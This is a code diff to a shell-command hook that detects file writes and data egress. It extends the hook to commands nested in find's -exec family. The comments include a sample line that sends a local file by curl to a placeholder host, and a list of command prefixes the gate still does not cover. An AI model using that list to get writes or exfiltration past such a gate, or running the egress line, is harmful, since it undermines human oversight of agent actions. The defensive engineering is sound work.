@@ -138,6 +138,73 @@
 #     hook's own extractor, "ls\ncp seed.txt src/x.py" emits NO row while
 #     "ls ; cp seed.txt src/x.py" emits `local /proj/src/x.py`.
 #
+# ── Same seam, fifth instance: A NESTED COMMAND INSIDE AN ARGUMENT LIST ─────
+# find's exec family carries a whole command as ARGUMENTS, ended by `\;`, `';'`, `";"` or
+# `+`. verb_at returns ONE verb per segment and returns at the first non-WRAPPERS name, so
+# cmd0 for the whole segment was `find`, matching none of the four write arms and none of
+# the egress verbs. MEASURED through this extractor before the fix, WRIT_CWD=/proj, every
+# one of them SILENT:
+#
+#   find . -name x -exec cp {} src/y.py \;                            -> set()
+#   find . -name x -exec cp {} src/y.py ';'                           -> set()
+#   find . -name x -exec cp -t src {} +                               -> set()
+#   find . -name x -execdir cp {} src/y.py \;                         -> set()
+#   find . -name x -ok cp {} src/y.py \;                              -> set()
+#   find . -name x -okdir cp {} src/y.py \;                           -> set()
+#   find . -name x -exec tee src/y.py \;                              -> set()
+#   find . -name x -exec sed -i s/a/b/ src/y.py \;                     -> set()
+#   find . -name x -exec curl -d @src/a.txt https://example.invalid \; -> set()
+#
+# Controls, same run: `find . -name x -print` was silent (correct), `find . -name x |
+# xargs cp -t src` already yielded `local /proj/src` (cycle P), and `find . -name x -exec
+# cp {} src/y.py \; ; cp seed.txt src/z.py` yielded ONLY `local /proj/src/z.py`, which is
+# what proved the segmentation around the construct was intact and only the nested command
+# was lost.
+#
+# THE FIX IS ONE SPLICE, and where it sits is the whole design: each nested span is
+# appended to `segments` as an ADDITIONAL entry (piped flag FALSE) before any pass runs,
+# so the write loop resolves cmd0 = cp, the egress loop resolves verb = curl, and the
+# interpreter pass sees a nested `python3 -c`, with NO new arm anywhere and no change to
+# verb_at. The two rejected alternatives are recorded because both look reasonable: a
+# fifth cmd0 arm would duplicate all four arms' destination logic and would not reach
+# egress at all, and refactoring the per-segment body into a shared function would rewrite
+# the code path every existing test runs through for no extra coverage.
+#
+# FOUR FLAGS, which is two more than this file used to name. `-ok` and `-okdir` prompt
+# before each command and then RUN it. Both were measured silent above and both were named
+# NOWHERE: not here, not in the ADR, not in a test. The earlier disclosure undercounted the
+# family, and a disclosure that misstates the size of a hole is what stops the next reader
+# re-examining it.
+#
+# THE BATCH FORM CANNOT CARRY A POSITIONAL DESTINATION, and find enforces that itself.
+# EXECUTED against findutils 4.9.0: `find . -maxdepth 0 -name __nomatch__ -exec cp {} dest
+# +` fails with "find: missing argument to `-exec'" (exit 1), because `{}` must be the
+# trailing argument under `+`. So under `+` a destination is reachable only as a FLAG VALUE
+# (`cp -t DIR {} +`), and no detector for `cp {} dest +` exists here, because that command
+# can never run. The `;` family has no ordering constraint, so a destination may sit
+# anywhere in the nested argument list.
+#
+# ACCEPTED COST, stated rather than discovered: `{}` is find's placeholder, not a path, and
+# the two brace discards elsewhere in this file (CODE_PUNCT in token_literals, the brace
+# skip in scan_tokens) are on the INTERPRETER path only, not on the cmd0 write arms. A
+# spelling that puts the placeholder in DESTINATION position (`-exec tee {} \;`,
+# `-exec sed -i s/a/b/ {} \;`) therefore emits a row naming the placeholder, resolved under
+# the cwd even when find's search root is elsewhere. It is fail-closed and strictly better
+# than the silence it replaces: a real in-place bulk edit now reaches the work gate instead
+# of no gate at all, and the only thing wrong is the TEXT of a path that no single file can
+# be named for. Both rows are pinned as tests. The two alternatives are recorded because
+# each is worse: a global brace skip at the normalization point would also turn a real
+# `echo x > src/{a}.py` into silence, and dropping `{}` out of the span makes the sed arm
+# read its SCRIPT as the file and leaves `tee {}` with no argument at all. Resolving find's
+# search root into the placeholder is a separate mechanism (find's path operands precede
+# its expression and may repeat) and is deliberately not attempted.
+#
+# DELETION STAYS OUT, by the recorded ruling in the irreversible-destruction block below
+# ("rm -rf, DROP TABLE and TRUNCATE are OUT OF SCOPE on purpose"): `find ... -exec rm {}
+# \;` and `find ... -delete` are silent after this fix too, because `rm` matches no cmd0
+# arm and `-delete` carries no nested command. Both are pinned, so the closure is not read
+# as smuggling deletion into scope.
+#
 # ── Second vector: EGRESS ────────────────────────────────────────────────────
 # The file name still says "write" because renaming it would churn hooks.json, the
 # generated docs/reference/hooks.md, the matcher-wiring test and the docs for no
@@ -204,10 +271,14 @@
 # check; the other five have no positional at all. What remains uncovered, with the
 # reason for each, and then the names alone in a machine-readable block:
 #
-#   find -exec / -execdir   A DIFFERENT MECHANISM, deferred to its own cycle: the nested
-#                           command sits INSIDE an argument list with a terminator (`\;`,
-#                           `';'` or `+`), not in front of the command, so no prefix step
-#                           can reach it. All four spellings measured silent.
+#   fd --exec / fd -x       The SAME nested-command mechanism under another tool's flag
+#                           spellings, which NESTED_CMD_FLAGS does not carry. NOT
+#                           MEASURED, so this is a stated suspicion and not a closed
+#                           hole. (find's own four command-running primaries, `-exec`,
+#                           `-execdir`, `-ok` and `-okdir`, WERE the fifth instance of
+#                           this seam and are CLOSED by the nested-command splice
+#                           documented above, so they are no longer named in the block
+#                           below.)
 #   sh -c / bash -c / eval  Behavior deliberately unchanged; the real reason is the
 #                           false-positive cost of gating every `bash -c`, not the false
 #                           one this file used to give. See the NOT COVERED note beside
@@ -227,7 +298,7 @@
 # the block is names only, and a name there must not also be a WRAPPERS key.
 #
 # UNCOVERED PREFIXES BEGIN (names only; the reasons are in the prose above)
-# find -exec, find -execdir, sh -c, bash -c, eval, coproc, function,
+# sh -c, bash -c, eval, coproc, function, fd --exec, fd -x,
 # ionice, chrt, flock, unbuffer, script, parallel, su -c, strace
 # UNCOVERED PREFIXES END
 #
@@ -1360,6 +1431,76 @@ def verb_at(seg):
     return "", len(seg), assigns
 
 
+# ── Nested commands: find's exec family ─────────────────────────────────────
+# A DIFFERENT MECHANISM from the WRAPPERS prefixes above, and the reason the find
+# spellings were pinned SILENT rather than closed with a flag table: the nested command
+# does not sit IN FRONT of the command, it sits INSIDE an argument list, ended by one of
+# find's own terminator tokens. verb_at returns ONE verb per segment and returns at the
+# first non-WRAPPERS name, so cmd0 for the whole segment was `find`, which matches none
+# of the four write arms below and none of EGRESS_VERBS.
+#
+# FOUR FLAGS, which is TWO MORE than this file used to name. `-ok` and `-okdir` prompt
+# before each command and then RUN it, and both were measured silent; naming only
+# `-exec` and `-execdir` undercounted the family, which is worse than a wide hole
+# honestly stated.
+#
+# Matched on the RAW token and never dequoted: a quoted `'-exec'` is a mention in
+# someone else's argument list and must not open a span, the same rule
+# strip_group_opener applies to a quoted group opener. NOT conditioned on the verb being
+# `find`: the FLAGS are the mechanism, and this file's own posture (see
+# WRAPPER_POSITIONALS) is fail-closed for the verb and fail-open for detection, where an
+# extra row for a command that never runs is cheaper than a lost row for one that does.
+NESTED_CMD_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
+# The terminator characters, AFTER one layer of shell quoting and one leading backslash
+# come off. MEASURED token forms through this extractor: an escaped semicolon arrives as
+# '\\;', a single-quoted one as "';'", a double-quoted one as '";"', and the batch form
+# as '+'. The first three survive as distinct tokens because _split_one_token keeps an
+# escaped character and a quoted span together, and none of them is a CONTROL member, so
+# a span end is reliably findable. A BARE semicolon never appears inside a segment at
+# all: it IS a CONTROL token, so it already ended the segment before this runs.
+NESTED_TERMINATOR_CHARS = frozenset({";", "+"})
+
+
+def is_nested_terminator(tok):
+    """True for find's own end-of-command token in any of its four spellings."""
+    t = dequote(tok)
+    if t.startswith("\\"):
+        t = t[1:]
+    return t in NESTED_TERMINATOR_CHARS
+
+
+def nested_command_spans(seg):
+    """Every nested command carried INSIDE this segment's argument list, as its own
+    token list.
+
+    Spliced into `segments` as ADDITIONAL entries by the caller rather than handled by a
+    fifth cmd0 arm, because the write pass, the interpreter pass and the egress pass are
+    three loops over the SAME list: one splice resolves `cp` for the write arms and
+    `curl` for the egress arms with no change to either set of arms and none to verb_at.
+    A fifth arm would duplicate all four arms' destination logic and would not reach
+    egress at all.
+
+    A span runs from the token after the flag to the terminator, or to the END of the
+    segment when there is none: a nested command with no terminator is a real spelling
+    users type (find itself rejects it, but this gate's job is to see the write, not to
+    validate find's grammar). A segment boundary is a hard stop for free, because
+    CONTROL tokens split segments before this ever runs.
+    """
+    spans = []
+    i = 0
+    while i < len(seg):
+        if seg[i] not in NESTED_CMD_FLAGS:
+            i += 1
+            continue
+        i += 1
+        start = i
+        while i < len(seg) and not is_nested_terminator(seg[i]):
+            i += 1
+        if i > start:
+            spans.append(seg[start:i])
+    return spans
+
+
 # Flags whose value is the NEXT token, so a value can never be mistaken for the URL or
 # the copy destination. Per verb on purpose: -T is curl's upload-file but wget's timeout.
 CURL_VALUE_FLAGS = {
@@ -1859,6 +2000,19 @@ for t in tokens:
         cur.append(t)
 if cur:
     segments.append((cur, piped))
+
+# Nested commands, spliced in as ADDITIONAL segments BEFORE any pass runs, so the write
+# loop resolves cmd0 for them and the egress loop resolves the verb, with no new arm on
+# either side. The original segment stays in the list: its cmd0 is `find`, it matches no
+# arm, and its redirect scan keeps working, so `find ... -exec ... \; > log` still gates
+# log. The list is SNAPSHOTTED first, so a spliced span is never itself rescanned: one
+# level is every level find has, and re-entering would be unbounded for no coverage. The
+# piped flag is FALSE for every span, because what feeds find's stdin does not feed the
+# command find execs, and the egress pass reads that bit as "local data feeds this
+# segment".
+for _seg, _piped in list(segments):
+    for _span in nested_command_spans(_seg):
+        segments.append((_span, False))
 
 raw_targets = []
 for seg, _piped_in in segments:
